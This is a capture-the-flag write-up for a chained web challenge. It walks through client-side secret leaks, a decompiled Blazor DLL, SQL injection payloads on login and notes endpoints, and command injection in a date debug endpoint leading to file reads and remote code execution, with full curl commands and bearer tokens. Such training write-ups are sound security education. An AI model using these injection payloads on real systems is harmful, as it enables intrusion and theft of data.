# Challenge Writeup

## TOC

- [[0] The Beginning](#0-the-beginning)
- [[1] Never trust the Client](#1-never-trust-the-client)
- [[2] What's the deal with Dashboards?](#2-whats-the-deal-with-dashboards)
- [[3] Going Internal](#3-going-internal)
- [[4] Admin rights for everybody!](#4-admin-rights-for-everybody)
- [[5] The Dreaded Lost Library](#5-the-dreaded-lost-library)
- [[6] Dumping the Barrel](#6-dumping-the-barrel)
- [[7] That's right, you can read!](#7-thats-right-you-can-read)
- [[8] Take Control](#8-take-control)
- [[9] I am groot!](#9-i-am-groot)

## [0] The Beginning

### Description

Omegapoint is gearing up for Cybersecurity Awareness Month, and the management team has hidden secret cybersecurity manuals for the worthy employees. Explore the newly developed note-taking application at `xxx:yyy` to find the hidden treasures and embark on your cybersecurity journey!

NOTE: use the user `guest:guest` if you want to test the application out! The note dashboard are currently only available for admin users.

### Solve

To begin with, the scenario-based challenges in this CTF are a set of 10 interconnected challenges based on the same scenario, and is made in such way that the player has to pivot and get foothold on multiple hosts in the same network. In this case, the players are supposed to "play" as pentesters and get a foothold on an internal note-taking application. One does not necessarily have to solve all the challenges in the intended order.

In this challenge we are provided with an url pointing to the mentioned note-taking application, as well as the credentials of `guest:guest` to test out the application. As an introductory challenge, the flag can be found by simply navigating to the site and interacting with it. The flag is found in the "about"-page alongside a summary text on the topic of Capture the Flag.

![the initial homepage](image.png)

### Flag

`OMEGAPOINT{83f05caf1127df716c253fc340fe87d3}`

## [1] Never trust the Client

### Description

How does one truly embark on the hunt for hidden secrets within a supposedly sourceless web application? But wait, is a client-side web application truly sourceless?

### Solve

Figuring out the underlying technlogies and frameworks used in a website is not only useful for a pentester working in a black-box environment, but it can also be useful for developers if they ever intend to take parts of the page as inspiration for their own work. A simple way of figuring this out can be done using the `devtools` which is a browser built-in tool one can use to help with the development of websites such as inspecting the DOM elements, checking the network traffics, memory profiling, etc...

Looking at the source code through the `devtools` reveals that this is a web application built with `Vite` (a build tool that handles things such as the build and bundle of the source code) + client-side `React` (a js framework that eases web application development). As this is a client-side web application, the whole source code is therefore given straight to the user so that the page can be rendered by the user's browser. This means that everything written by the developer, can be seen by the users (the bundled source code are luckily a bit different from the source code written by the developers thanks to the obfuscation done by minifying the code and bundling the different libraries used in the application, however, obfuscation alone is by no means a good way of securing an application). Secrets such as API tokens or environment variables that is not supposed to be available for the client user should therefore not be included in such applications.

Checking the source code and searching for the flag format of `OMEGAPOINT{` reveals the flag, which is used as a token in an endpoint sent to the backend API for retrieving notes as seen in the code snippet below:

```js
const Yy = {
    URL: "/api"
}
  , QC = async()=>await (await fetch(`${Yy.URL}/notes?token=OMEGAPOINT{7c0e12caf742bf36e604250fa8cc70fd}`, {
    headers: {
        Authorization: `Bearer ${Pg()}`
    }
})).json();
```

### Flag

`OMEGAPOINT{7c0e12caf742bf36e604250fa8cc70fd}`

## [2] What's the deal with Dashboards?

### Description

You get a dashboard, and you get a dashboard. Everyone gets a dashboard! Are you able to find the hidden dashboard and discover what's shown within it?

### Solve
Knowing that the web application is built with React client-side, the bundled code would therefore be found at the top part of the bundled source code, while the actual code written by the developers are found in the bottom part of the bundled source code. With this knowledge, one can easily figure out the application logic. Looking through this reveals all the available endpoints of this SPA. Here we can see the path `/yet_another_dashboard_nice` standing out from all the endpoints:

```js
const nk = zx([{
    path: "/",
    element: M.jsx(YC, {})
}, {
    path: "/login",
    element: M.jsx(qC, {})
}, {
    path: "/logout",
    element: M.jsx(tk, {})
}, {
    path: "/about",
    element: M.jsx(ek, {})
}, {
    path: "/dashboard",
    element: M.jsx(XC, {})
}, {
    path: "/yet_another_dashboard_nice",
    element: M.jsx(ZC, {})
}]);
ml.createRoot(document.getElementById("root")).render(M.jsxs(b.StrictMode, {
    children: [M.jsx(Mx, {
        router: nk
    }), M.jsx(sw, {})]
}));
```

Navigating to this endpoint, however, redirects us to the homepage. With the source code in mind, the React component shown in the endpoint can be seen to be `ZC()`, and looking through it's code reveals that it is simply a page containing some headers and an image. The redirect is due to an `useEffect`-hook being called upon the first render:
```js
function ZC() {
    const e = yi();
    return R.useEffect(()=>{
        e("/")
    }
    , [e]),
    M.jsxs(M.Fragment, {
        children: [M.jsx(to, {}), M.jsxs("main", {
            className: "px-4 max-w-[1080px] mx-auto",
            children: [M.jsx("h1", {
                className: "text-2xl font-bold pb-6",
                children: "Just a dashboard"
            }), M.jsx("p", {
                className: "pb-4 text-sm",
                children: "Here's another dashboard for you!"
            }), M.jsx("img", {
                src: "/dashboard_image.png",
                alt: "simply an image"
            })]
        }), M.jsx(ro, {}), M.jsx(no, {})]
    })
}
```

Uisng Chrome and it's built-in support for live edits on javascript files, one could simply patch out the `useEffect` being called and navigating to the endpoint for the flag. Alternatively, one could also directly navigate to the image by going to the endpoint `/dashboard_image.png`.

![the dashboard containing an image of the flag](image-1.png)

### Flag

`OMEGAPOINT{7774447bfebcb09e9528c9da49fd4ab3}`

## [3] Going Internal

### Description

We love the .NET ecosystem and rewrote the whole web UI in an unarguably better framework! However, it's currently in preview, and we're not giving you the link to it.

### Solve

Knowing that there exists a preview page that could be navigated from the React application, one could figure out that the link to that page should be somewhere in the bundled source code. Taking a look at all the code for the different components used in the endpoints, shows some suspiciously strange logic set as an `onClick`-event handler on a button on the endpoint of `/dashboard`:

```js
const o = ()=>{
        window.location.hash.endsWith("???") && (window.location.href = atob("L3ByZXZpZXctdjI="))
    }
```

From the looks of it, navigating to the endpoint with a hash of `???`, thus`/dashboard#???`, redirects the user to some strange base64-encoded address. Checking the output of the base64-encoded value, reveals it to be `/preview-v2`, and navigating to the page shows that it is indeed an application built with .NET using the Blazor framework. The flag could be found in the homepage of the Blazor application.  

![preview web application](image-2.png)

### Flag

`OMEGAPOINT{ccb37d76162deb4461bc2ac3026ef71c}`

## [4] Admin rights for everybody!

### Description

To unlock the dashboard's full potential, it appears you'll need admin privileges. Investigate the authentication mechanism at the login endpoint, which seems to involve SQL.

### Solve
Aside from the client-side, there seemed tr be some endpoints connected to a back-end API as well. Namely `/api/login` and `/api/notes`. Knowing that one should investigate the login-endpoint one could try to fuzz different characters on the form fields to see if there is a possibility of triggering an error, which can sometimes provide detailed messages one usually want to hold hidden. Following the network traffic and trying to fuzz the login endpoint with some symbols such as `'` reveals an error message containing the SQL query. There seems to be an SQL injection vulnerability in the login-endpoint where the developers had seemed to not use parameterized queries:

```json
{
  "status": "error",
  "error": {
    "name": "SqlError",
    "sqlMessage": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'a'' at line 1",
    "sql": "SELECT id, username, isAdmin FROM users WHERE username='a'' AND password='a'; - parameters:[]",
    "fatal": false,
    "errno": 1064,
    "sqlState": "42000",
    "code": "ER_PARSE_ERROR"
  }
}
```

With this one can essentially dump the whole database including all the notes and users. Navigating through the users can for example be done through the usage of `LIMIT` and `OFFSET` clause in SQL.

Setting the following payload as the username gives us an user with the flag as the username. Moving the offset by 1, gives us the admin user.
```sql
' OR 1=1 LIMIT 1 OFFSET 1 -- -
```

![logged in user containing the flag](image-3.png)

### Flag

`OMEGAPOINT{50e1ad3bbd85c57c528f06f84dafd174}`

## [5] The Dreaded Lost Library

### Description

The reliance on libraries has inadvertently exposed hidden secrets of the web application. Can you find the exposed secret?

### Solve
Jumping to the preview web application built with the Blazor framework. One can see that in this application, it is similar to React, a clien/side framework running under WebAssembly in the interpreted mode. This means that the .NET Mono runtime is compiled to WebAssembly, while the .NET assemblies are loaded and executed through the runtime as DLL files. However, since the DLL files are built by the normal .NET compilation toolchain, and we know by the fact that C# compiles to bytecode before being compiled to machine code. The source code of the application could therefore be leaked by decompilation due to the nature of C# as a programming language as of .NET version 7.

Looking through the network traffic using `devtools` one can see that loads of DLL files are being loaded and sent to the client. One of such files named `webapp2.dll` seemed to be the one containing the compiled assembly of the web application. Retrieving that said DLL file and using tools such as such as [https://github.com/dnSpy/dnSpy](dnSpy), [https://www.jetbrains.com/decompiler/](dotPeek) and [https://github.com/icsharpcode/ILSpy](ilSpy) one can decompile the DLL file for the source code.

Looking at the decompiled source code one can find the flag in the singleton `SharedStateService`:
```c#
public class SharedStateService
{
	public string Flag = "OMEGAPOINT{1da92dcfcbe4122b3e99cc25dc6d71d8}";

	[CompilerGenerated]
	private Action? m_OnStateChange;

	[field: CompilerGenerated]
	public string Token
	{
		[CompilerGenerated]
		get;
		[CompilerGenerated]
		set;
	} = "";


	[field: CompilerGenerated]
	public User? User
	{
		[CompilerGenerated]
		get;
		[CompilerGenerated]
		set;
	}

	[field: CompilerGenerated]
	public string CurrentPath
	{
		[CompilerGenerated]
		get;
		[CompilerGenerated]
		set;
	} = "/preview-v2";


	public event Action OnStateChange
	{
		[CompilerGenerated]
		add
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			Action val = this.m_OnStateChange;
			Action val2;
			do
			{
				val2 = val;
				Action val3 = (Action)System.Delegate.Combine((System.Delegate)(object)val2, (System.Delegate)(object)value);
				val = Interlocked.CompareExchange<Action>(ref this.m_OnStateChange, val3, val2);
			}
			while (val != val2);
		}
		[CompilerGenerated]
		remove
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			Action val = this.m_OnStateChange;
			Action val2;
			do
			{
				val2 = val;
				Action val3 = (Action)System.Delegate.Remove((System.Delegate)(object)val2, (System.Delegate)(object)value);
				val = Interlocked.CompareExchange<Action>(ref this.m_OnStateChange, val3, val2);
			}
			while (val != val2);
		}
	}

	public void SetToken(string token)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		if (token.Length > 0)
		{
			JwtSecurityTokenHandler val = new JwtSecurityTokenHandler();
			((TokenHandler)val).ReadToken(token);
			SecurityToken obj = ((TokenHandler)val).ReadToken(token);
			JwtSecurityToken val2 = (JwtSecurityToken)(object)((obj is JwtSecurityToken) ? obj : null);
			if (val2 != null)
			{
				try
				{
					int id = Convert.ToInt32(val2.Claims.First((Claim claim) => claim.Type == "id").Value);
					string value = val2.Claims.First((Claim claim) => claim.Type == "username").Value;
					bool isAdmin = Convert.ToBoolean(Convert.ToInt32(val2.Claims.First((Claim claim) => claim.Type == "isAdmin").Value));
					User = new User(id, value, isAdmin);
					Token = token;
				}
				catch
				{
				}
			}
		}
		else
		{
			User = null;
			Token = "";
		}
		NotifyStateChanged();
	}

	public void SetCurrentPath(string path)
	{
		CurrentPath = path;
		NotifyStateChanged();
	}

	private void NotifyStateChanged()
	{
		Action? onStateChange = this.OnStateChange;
		if (onStateChange != null)
		{
			onStateChange.Invoke();
		}
	}
}

```

### Flag

`OMEGAPOINT{1da92dcfcbe4122b3e99cc25dc6d71d8}`

## [6] Dumping the Barrel

### Description

As you explore the web application, you may find a way to access notes. However, even with admin privileges, accessing the note comments seems to not be possible.

### Solve
From the challenge [[4] Admin rights for everybody!](#4-admin-rights-for-everybody), one can easily dump the whole database and from there find the flag located as a comment on a note. Alternatively, the decompiled sourec code from the DLL file revealed a filter parameter on the notes-endpoint, which were vulnerable to SQL injection as well. An example of a payload retrieving comments from the notes in the database as well as the flag can be seen below: 

```sh
curl -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywidXNlcm5hbWUiOiJhZG1pbiIsImlzQWRtaW4iOjEsImlhdCI6MTcwMTE3MzQ4NiwiZXhwIjoxNzMyNzA5NDg2fQ.TFzllamMp0d7Rv9eIdRvvJHWr8-dk0h2iZSY1Z6nV5c' 'http://51.120.250.68/api/notes?token=OMEGAPOINT%7B7c0e12caf742bf36e604250fa8cc70fd%7D&filter=1=0%20UNION%20SELECT%201,2,comment%20FROM%20notes'
```

![sql injection on the notes endpoint containing the flag](image-4.png)

### Flag

`OMEGAPOINT{d4fba280dd6162ca55bdcb26feb12f05}`

## [7] That's right, you can read!

### Description

Certain debugging endpoints of the server have been exposed through the library. Can you exploit them to your advantage?

### Solve
Through the decompiled source code, we can also see a debug endpoint at `/api/debug/date?format=`:

```c#
[AsyncStateMachine(typeof(<DebugDate>d__7))]
public async System.Threading.Tasks.Task<string> DebugDate()
{
    //IL_0002: Unknown result type (might be due to invalid IL or missing references)
    //IL_0007: Unknown result type (might be due to invalid IL or missing references)
    HttpRequestMessage val = new HttpRequestMessage(HttpMethod.Get, "/api/debug/date?format=%2B%25A%2C%20%25d.%25b%20%25Y%20-%20%25H%3A%25M%3A%25S");
    ((HttpHeaders)val.Headers).Add("Authorization", "Bearer " + stateService.Token);
    HttpResponseMessage val2 = (await httpClient.SendAsync(val)) ?? throw new System.Exception();
    if (val2.IsSuccessStatusCode)
    {
        return ((await JsonSerializer.DeserializeAsync<DataResponse>(await val2.Content.ReadAsStreamAsync(), (JsonSerializerOptions)null, default(CancellationToken))) ?? throw new System.Exception("Failed to deserialize response.")).Data ?? throw new System.Exception();
    }
    return "";
}
```
From the notes in the database, one can see that the debug endpoints runs through bash commands, and it seems that there is a vulnerability on command injection found in the format argument on the unix command, `date`. Alternatively, one can also figure this out by fuzzing the input and reading the error messages.

With sites such as [GTFOBins](https://gtfobins.github.io/) one could quickly figure out that one could do arbitrary file reads (https://gtfobins.github.io/gtfobins/date/). As one figure out the backend to be written with express, one could figure out the file structure by reading `package.json`, and further the `index.js` file containing the code for the backend logic. Doing so reveals the flag as a token for another more-detailed-debug-endpoint.

![local file read on the debug endpoint](image-5.png)

### Flag

`OMEGAPOINT{d8b732c8a1d3e796be06bb8b8a172e7a}`

## [8] Take Control

### Description

Knowing how to read is a good start, but can you also figure out how to access the server? It's necessary to figure out the parameters for the debugging endpoint.

### Solve
From the looks of the solves during the CTF, it had seemed that some unintended solutions came in due to the flag file being easily guessable, where one just did a file read directly on the flag by figuring out the user and file structure of the system. However, the intended solution which is needed to further advance to the next and last challenge is to get RCE in the system. The more-detailed-debug-endpoint calls the unix command `date` again, but using `child_process.exec()`. This means, that one can control and chain multiple commands more freely, enabling RCE. An example payload for this is to simply add an semicolon (`;`) and then chain another command after `date` is executed.

```sh
curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywidXNlcm5hbWUiOiJhZG1pbiIsImlzQWRtaW4iOjEsImlhdCI6MTcwMTE3MzQ4NiwiZXhwIjoxNzMyNzA5NDg2fQ.TFzllamMp0d7Rv9eIdRvvJHWr8-dk0h2iZSY1Z6nV5c' -H 'X-DEBUG: OMEGAPOINT{d8b732c8a1d3e796be06bb8b8a172e7a}' 'http://51.120.250.68/api/debug/date?format=a;cat%20/home/user/flag.txt'
```
![reverse shell](image-6.png)

### Flag

`OMEGAPOINT{8fe9deb64640640925372079449bfcb5}`

## [9] I am groot!

### Description

You're very close to the secret manuals now. Can you grow from a mere user to the mighty admin?

### Solve
Navigating around the system reveals the user `admin`, which we do not have control over. To more easily take control over the user `user` one could spawn a reverse shell on the system. Also, having a non-interactive tty-shell, there are certain commands and stuff one can't do. Using sites such as https://www.revshells.com/ can help with building a payload for creating a reverse shell on the target system.

![Alt text](image.png)

### Flag

`OMEGAPOINT{df96d4cefdca2c0350017ec64ad20529}`
